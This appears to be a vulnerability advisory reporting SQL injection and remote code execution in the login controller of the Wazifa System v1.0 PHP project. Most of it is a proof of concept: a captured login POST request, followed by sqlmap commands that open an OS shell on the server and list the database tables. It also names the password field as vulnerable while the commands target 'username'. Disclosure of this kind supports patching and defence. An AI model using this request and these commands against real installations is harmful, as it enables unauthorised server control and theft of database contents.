# Wazifa System in PHP RCE

https://code-projects.org/wazifa-system-in-php-css-js-and-mysql-free-download/

## NAME OF AFFECTED PRODUCT(S)

Wazifa System

## Vendor of Product

https://code-projects.org/wazifa-system-in-php-css-js-and-mysql-free-download/

##  **Manufacturers sites**

https://code-projects.org/

## Affected Compoent

### Vulnerable File

logincontrol.php

###  VERSION(S)

-  v1.0

### Software Link

https://download.code-projects.org/details/82bd09bf-dc3d-4700-912e-2e315eb4777e

## Vulnerability Type

SQL INJECTION , Remote Code Excute.

## Attacted Type

Remote			

## **Description of the vulnerability**

 In the login page, there is an unauthorized SQL injection vulnerability where the password is entered, which can obtain database information and execute code to obtain server permissions.                                                                                                                                                                                                                                                                                                                                                                                               

![image-20241031224942721](https://github.com/user-attachments/assets/495e5d89-00b6-4e1d-9b41-a8c9c7134c4f)

## **Vulnerability recurrence**

### **POC**

```
POST /controllers/logincontrol.php HTTP/1.1
Host: collegeproject-wazifa
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: http://collegeproject-wazifa
Connection: close
Referer: http://collegeproject-wazifa/login.php
Cookie: PHPSESSID=71m3j6l9g02u9ia1mteslaie7a
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=hamada2&password=1234
```

Save this packet as a 1.txt.

**This vulnerability can be used to obtain server privileges by execute this command.**

```
python sqlmap.py -r 1.txt -p "username" --os-shell
```

Result

![image-20241031220230972](https://github.com/user-attachments/assets/9ff6c6e4-98e5-49da-93bd-20fb399ece58)

**Run the following code to obtain the database information**

```
python sqlmap.py -r 1.txt -p "username" --tables
```

![image-20241031224555322](https://github.com/user-attachments/assets/68aee6a7-99c3-48b1-9140-e03b67864343)